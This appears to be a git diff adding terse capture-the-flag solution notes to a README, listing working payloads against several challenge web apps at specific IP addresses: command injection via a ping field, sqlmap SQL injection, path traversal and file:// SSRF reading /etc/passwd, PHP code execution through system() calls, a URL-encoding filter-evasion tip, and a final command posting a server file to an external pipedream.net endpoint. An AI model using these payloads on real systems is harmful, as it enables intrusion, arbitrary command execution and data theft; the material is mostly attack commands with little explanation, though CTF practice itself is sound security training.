@@ -1,6 +1,45 @@
 # ctf
 ctf
 
+Ping station (Command injection vulnerability)
+1.1.1.1;ls
+1.1.1.1; cat flag – open file
+1.1.1.1; pwd – current directory
+1.1.1.1; whoami – current user
+1.1.1.1; find / -name flag – search
+1.1.1.1; ps aux -- Display running processes on the system.
+1.1.1.1; top -- Display real-time system information, such as running processes, memory, and CPU usage.
+
+ small-data-leak (Sql Injection vulnerability)
+http://34.141.113.155:32320/user?id= 
+└─$ sqlmap -u http://34.141.113.155:32320/user?id=1
+sqlmap -u "http://34.141.113.155:32320/user?id=1" –dbs
+$ sqlmap -u "http://34.141.113.155:32320/user?id=1" -D public –tables
+$ sqlmap -u "http://34.141.113.155:32320/user?id=1" -D public -T "ctf{57b23475b9b02093a9eb5d7df5f07957e2b2dc724443d6b08961fbe3387" –columns
+ file-crawler(File Inclusion)
+<img src="local?image_name=static/path.jpg" align="middle">
+http://34.141.113.155:32610/local?image_name=../../../etc/passwd
+curl http://34.107.71.117:30687/local?image_name=/tmp/flag
+
+Attackers might encode characters in the URL to evade detection. For example, converting characters like & or / into their hexadecimal equivalents (%26 for & or %2F for /) can bypass simple filters that don't decode URLs before checking.
+•	Example: /admin → %2Fadmin.
+
+ ultra-crawl
+file:///home/ctf/app.py
+curl -X POST "http://34.141.113.155:30477/" -d "url=file:///etc/passwd"   
+curl -X POST "http://34.141.113.155:30477" -d "url=file:///home/ctf/sir-a-random-folder-for-the-flag/flag.txt"
+└─$ curl -X GET "http://34.141.113.155:30477/" -H "Host: company.tld"
+ alien-inclusion(Request Forgery)
+curl http://34.141.113.155:31736/?vector=/Admin/e&replace=phpinfo()
+curl "http://34.141.113.155:31736/?start=" --data "start=flag.php"   
+                                                                                                                                                                                                 
+ substitute(Code Execution)
+http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('whoami')
+http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('ls -la')
+http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('ls -la /var/www/html/here_we_dont_have_flag')
+http://34.141.113.155:31714/index.php?vector=/Admin/e&replace=system('cat /var/www/html/here_we_dont_have_flag/flag.txt')
+
+
 Downloader-v1:
 https://eodlwq7lnoytrkk.m.pipedream.net / --post-file '/var/www/html/flag.php' 
 
